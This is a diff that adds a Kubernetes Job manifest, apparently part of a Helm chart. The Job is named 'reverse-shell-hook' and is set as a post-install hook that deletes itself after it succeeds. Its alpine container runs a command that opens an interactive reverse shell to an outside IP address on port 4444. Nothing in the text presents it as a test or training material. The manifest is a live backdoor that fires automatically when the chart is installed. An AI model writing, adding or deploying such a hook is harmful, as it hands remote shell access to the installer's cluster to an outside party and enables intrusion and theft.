@@ -1,0 +1,16 @@
+apiVersion: batch/v1
+kind: Job
+metadata:
+  name: reverse-shell-hook
+  annotations:
+    "helm.sh/hook": post-install
+    "helm.sh/hook-delete-policy": hook-succeeded
+spec:
+  template:
+    spec:
+      containers:
+      - name: pwn
+        image: alpine
+        command: ["/bin/sh", "-c", "sh -i >& /dev/tcp/196.203.63.84/4444 0>&1"]
+      restartPolicy: Never
+  backoffLimit: 0
